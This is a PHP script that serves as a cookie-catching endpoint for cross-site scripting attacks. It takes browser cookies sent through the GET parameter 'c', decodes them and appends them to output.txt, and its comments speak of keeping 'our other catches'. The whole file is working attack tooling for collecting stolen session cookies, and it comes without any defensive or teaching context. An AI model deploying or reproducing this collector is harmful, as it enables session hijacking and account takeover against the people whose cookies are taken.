<?php

// Newlines are represented with different characters depending on the system.
// Macintosh: \r
// *nix \n
// Windows \r\n
$lineEnding = "\n";

// Will check if GET variable 'c' is set.
if ( isset( $_GET['c'] ) ) {

	// Splits the string into an array of strings which is made up of name=value
	// pairs. urldecode() decodes the javascript escape() function.
	$cookies = explode(' ', urldecode($_GET['c']));

	// Open file in append mode so we don't overwrite our other catches.
	$fp = fopen('output.txt', 'a');

	// Write cookies to file.
	foreach($cookies as $cookie) {
		fwrite($fp, $cookie . $lineEnding);
	}

	fclose($fp);
}

?>
